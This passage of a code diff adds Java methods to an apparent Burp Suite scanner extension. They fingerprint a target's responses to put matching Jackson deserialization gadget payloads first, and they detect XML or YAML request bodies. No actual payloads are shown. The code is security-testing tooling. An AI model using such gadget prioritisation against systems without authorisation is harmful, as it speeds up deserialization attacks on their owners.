+     * gadget families to the front of the payload list.
+     *
+     * This is a pure optimization — it does NOT change detection accuracy or generate findings.
+     * All payloads are still tested; only the order changes.
+     */
+    private String[][] prioritizeJacksonPayloads(String[][] payloads, HttpRequestResponse original) {
+        if (original.response() == null) return payloads;
+
+        // Build a single string from all response headers + first 4KB of body for pattern matching
+        StringBuilder sigBuf = new StringBuilder(4096);
+        for (var header : original.response().headers()) {
+            sigBuf.append(header.name()).append(": ").append(header.value()).append('\n');
+        }
+        try {
+            String body = original.response().bodyToString();
+            if (body != null) {
+                sigBuf.append(body, 0, Math.min(body.length(), 4096));
+            }
+        } catch (Exception ignored) {}
+        String signature = sigBuf.toString();
+
+        // Collect prioritized gadget name fragments from all matching hints
+        Set<String> prioritized = new LinkedHashSet<>();
+        for (String[] hint : CLASSPATH_HINTS) {
+            if (hint[1].isEmpty()) continue; // Skip non-Java targets
+            if (Pattern.compile(hint[0], Pattern.CASE_INSENSITIVE).matcher(signature).find()) {
+                for (String gadget : hint[1].split(",")) {
+                    prioritized.add(gadget.trim());
+                }
+            }
+        }
+
+        if (prioritized.isEmpty()) return payloads; // No hints matched — use default order
+
+        // Partition: matching gadgets first, then the rest (preserving original order within each group)
+        List<String[]> front = new ArrayList<>();
+        List<String[]> rest = new ArrayList<>();
+        for (String[] payload : payloads) {
+            String name = payload[0];
+            boolean matched = false;
+            for (String gadget : prioritized) {
+                if (name.contains(gadget)) { matched = true; break; }
+            }
+            (matched ? front : rest).add(payload);
+        }
+        front.addAll(rest);
+        return front.toArray(new String[0][]);
+    }
+
+    /** Returns true if the original request's Content-Type indicates XML. */
+    private boolean isXmlContentType(HttpRequestResponse original) {
+        for (var header : original.request().headers()) {
+            if (header.name().equalsIgnoreCase("Content-Type")) {
+                String ct = header.value().toLowerCase();
+                return ct.contains("xml") || ct.contains("text/xml") || ct.contains("application/xml");
+            }
+        }
+        return false;
+    }
+
+    /** Returns true if the original request's Content-Type indicates YAML. */
+    private boolean isYamlContentType(HttpRequestResponse original) {
+        for (var header : original.request().headers()) {
+            if (header.name().equalsIgnoreCase("Content-Type")) {
+                String ct = header.value().toLowerCase();
+                return ct.contains("yaml") || ct.contains("yml");
+            }
+        }
+        return false;
     }
 
     // ==================== BLIND OOB SPRAY ====================
